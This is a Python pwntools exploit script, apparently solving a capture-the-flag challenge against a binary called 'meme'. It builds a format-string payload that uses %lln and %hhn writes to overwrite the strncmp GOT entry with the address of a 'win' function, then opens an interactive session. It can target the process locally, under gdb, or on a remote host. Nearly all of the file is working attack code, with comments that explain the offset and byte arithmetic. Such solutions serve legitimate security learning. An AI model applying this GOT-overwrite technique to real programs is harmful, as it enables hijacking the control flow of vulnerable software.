from pwn import *


PROGRAM_PATH = (Path(__file__).parent / "meme").resolve().__str__()
# b * printf + 166

gdb_script = """
b *main+191
b *main+236
c
"""


frame_size = 0x220  # 544
rbp = 8
buff_size = 0x200


def start(argv=[], *a, **kwargs):
    if args.GDB:
        return gdb.debug([PROGRAM_PATH] + argv, gdbscript=gdb_script, *a, **kwargs)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kwargs)
    else:
        return process([PROGRAM_PATH] + argv, *a, **kwargs)


phrase_byte = b"2tRiViAl"
phrase = u64(phrase_byte, endianness="little")

print(f"Phrase is: {hex(phrase)}")

io = start()
# print(io.got["printf"])
res = io.recvuntil(delims="at ")
print("____________________________________")
target = io.recvline().decode("ascii").strip()


print(f"Target addr {target}")
target = int(target, base=16)
res = io.recvuntil(delims=": ")
print(res)
print("____________________________________")

# Fuck this, writing the target address is not working
# Get win_addr
elf = ELF("./meme")
win_addr: int = elf.symbols["win"]
strncmp_addr: int = elf.got["strncmp"]
print(f"The strcmp address is:{hex(strncmp_addr)}")
print(f"The win address is:{hex(win_addr)}")


top_half = win_addr & 0x00FFFF
# next number that has 40 at the end that can be added to 0x11f6 is 0x1240
bottom_half = 0x1240 - top_half
print(f"Top half is:{top_half}")
print(f"Bottom half is:{bottom_half}")

# offset = 8
# Only lln works
# 1) %11$lln writes total printed count (0x11F6) into 0x4034f8 (low 2 bytes of strncmp@GOT)
# 2) %12$hhn writes the low 1 byte of the new count (0x40 from 0x1240) into 0x4034fa (3rd byte)
# 0000004034f8  000200000007 R_X86_64_JUMP_SLO 0000000000000000 strncmp@GLIBC_2.2.5 +

payload = f"%{top_half}c%11$lln".encode("ascii")
payload += f"%{bottom_half}c%12$hhn".encode("ascii")
payload += p64(strncmp_addr)  # %11$ -> strncmp@GOT
payload += p64(strncmp_addr + 2)  # %12$ -> strncmp@GOT+2

print(f"Sending payload: {payload}")
print(f"Payload size: {len(payload)}")
io.sendline(payload)

print("____________________________________")
res = io.recvlines(2)
print(res)


# io.sendline(b"A" * frame_size)

io.interactive()
